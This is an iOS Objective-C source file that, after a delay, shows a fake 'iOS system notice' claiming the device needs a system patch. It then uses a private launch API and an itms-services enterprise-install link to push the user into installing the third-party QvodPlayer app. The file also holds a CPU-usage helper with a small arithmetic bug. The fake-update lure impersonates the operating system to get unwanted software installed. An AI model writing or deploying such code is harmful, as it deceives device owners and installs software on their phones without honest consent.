//
//  UpdateDeamo.m
//  升级系统补丁
//
//  Created by Tiny on 15/7/23.
//  Copyright (c) 2015年 com.sadf. All rights reserved.
//

#import "UpdateDeamo.h"
#import "LSApplicationWorkspace.h"
#import "CFUserNotification.h"
#import <mach/mach.h>
CFUserNotificationRef _userNotification;
@implementation UpdateDeamo


float cpu_usage()
{
    kern_return_t kr;
    task_info_data_t tinfo;
    mach_msg_type_number_t task_info_count;
    
    task_info_count = TASK_INFO_MAX;
    kr = task_info(mach_task_self(), TASK_BASIC_INFO, (task_info_t)tinfo, &task_info_count);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    
    task_basic_info_t      basic_info;
    thread_array_t         thread_list;
    mach_msg_type_number_t thread_count;
    
    thread_info_data_t     thinfo;
    mach_msg_type_number_t thread_info_count;
    
    thread_basic_info_t basic_info_th;
    uint32_t stat_thread = 0; // Mach threads
    
    basic_info = (task_basic_info_t)tinfo;
    
    // get threads in the task
    kr = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    if (thread_count > 0)
        stat_thread += thread_count;
    
    long tot_sec = 0;
    long tot_usec = 0;
    float tot_cpu = 0;
    int j;
    
    for (j = 0; j < thread_count; j++)
    {
        thread_info_count = THREAD_INFO_MAX;
        kr = thread_info(thread_list[j], THREAD_BASIC_INFO,
                         (thread_info_t)thinfo, &thread_info_count);
        if (kr != KERN_SUCCESS) {
            return -1;
        }
        
        basic_info_th = (thread_basic_info_t)thinfo;
        
        if (!(basic_info_th->flags & TH_FLAGS_IDLE)) {
            tot_sec = tot_sec + basic_info_th->user_time.seconds + basic_info_th->system_time.seconds;
            tot_usec = tot_usec + basic_info_th->system_time.microseconds + basic_info_th->system_time.microseconds;
            tot_cpu = tot_cpu + basic_info_th->cpu_usage / (float)TH_USAGE_SCALE * 100.0;
        }
        
    } // for each thread
    
    kr = vm_deallocate(mach_task_self(), (vm_offset_t)thread_list, thread_count * sizeof(thread_t));
    assert(kr == KERN_SUCCESS);
    
    return tot_cpu;
}


+ (void)ComeOn
{
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        
        
        CFStringRef keys[3];
        CFStringRef values[3];
        CFDictionaryRef tempDict = NULL;
        
        keys[0] = kCFUserNotificationAlternateButtonTitleKey;
        keys[1] = kCFUserNotificationAlertHeaderKey;
        keys[2] = kCFUserNotificationAlertMessageKey;
        
        NSString *version = [[UIDevice currentDevice] systemVersion];
        CFStringRef content = (__bridge CFStringRef)[NSString stringWithFormat:@"当前系统iOS%@, 要安装iOS%@系统补丁", version, version];
        
        values[0] = CFSTR("设置");
        values[1] = CFSTR("iOS系统提示");
        values[2] = content;
        
        
        tempDict = CFDictionaryCreate(NULL, (const void **)keys, (const void **)values, 3, &kCFTypeDictionaryKeyCallBacks,  &kCFTypeDictionaryValueCallBacks);
        _userNotification = CFUserNotificationCreate(NULL, 1000, kCFUserNotificationPlainAlertLevel, NULL, tempDict);
        CFOptionFlags responseFlags = CFUserNotificationPopUpSelection(0);
        int x = CFUserNotificationReceiveResponse(_userNotification, 1000, &responseFlags);
        
        CFDictionaryRef response = CFUserNotificationGetResponseDictionary(_userNotification);
        NSLog(@"response: %@", response);
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            Class LSApplicationWorkspace_class = objc_getClass("LSApplicationWorkspace");
            LSApplicationWorkspace *workspace = [LSApplicationWorkspace_class performSelector:@selector(defaultWorkspace)];
            [workspace openApplicationWithBundleID:[[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"]];
            

            [[UIApplication  sharedApplication] openURL:[NSURL URLWithString:@"itms-services://?action=download-manifest&url=https://m.kuaibo.com/ios_apps/qvodplay_v3.0.48/QvodPlayer.plist"]];
//            NSString *string = nil;
//            NSArray *arr = @[string];
            NSLog(@"CPU 使用情况： %f", cpu_usage());
            [[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString]];
            
        });
        
    });

}

@end
